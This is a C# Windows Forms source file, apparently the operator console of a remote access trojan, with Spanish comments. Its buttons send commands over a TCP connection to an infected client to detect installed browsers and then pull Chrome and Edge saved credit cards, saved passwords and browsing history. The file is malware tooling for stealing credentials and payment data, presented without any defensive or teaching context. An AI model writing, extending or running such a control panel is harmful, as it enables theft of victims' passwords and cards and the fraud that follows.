
using System.Net.Sockets;
using Server.Conexion;
using Server.Log;

namespace Server
{
    public partial class BrowserModule : Form
    {
        public static BrowserModule Instance { get; private set; }
        private TcpClient _cliente;
        private int _idCliente;

        private static Logger _logger = Logger.getInstance();
        public BrowserModule(int id, TcpClient cliente)
        {
            InitializeComponent();
            Instance = this;
            _cliente = cliente;
            _idCliente = id;
        }

        private void BrowserModule_Load(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "browsers", Channel.BrowserModule);

        }


        public void detectarNavegadores(string payload)
        {
            InvokeIfRequired(() =>
            {
                if (payload.Contains("chrome.exe"))
                    groupBox1.Visible = true;
                pictureBox1.Visible = true;

                if (payload.Contains("iexplore.exe") || payload.Contains("msedge.exe"))
                    groupBox2.Visible = true;
                pictureBox2.Visible = true;

                if (payload.Contains("firefox.exe"))
                    groupBox3.Visible = true;
                pictureBox3.Visible = true;

            }, groupBox1, groupBox2, groupBox3, pictureBox1, pictureBox2, pictureBox3);



        }

        private void button1_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "chrome_cards", Channel.BrowserModule);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "chrome_password", Channel.BrowserModule);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "chrome_history", Channel.BrowserModule);

        }

        private void button4_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "edge_cards", Channel.BrowserModule);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "edge_password", Channel.BrowserModule);

        }

        private void button6_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "edge_history", Channel.BrowserModule);


        }

        private void InvokeIfRequired(Action action, params Control[] controls)
        {
            if (controls.Any(c => c.InvokeRequired))
                controls.First().Invoke(action);  // Invoca desde el primero que lo requiera
            else
                action();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            this.Close();  // Cierra el formulario y detiene el módulo del navegador
        }
    }
}
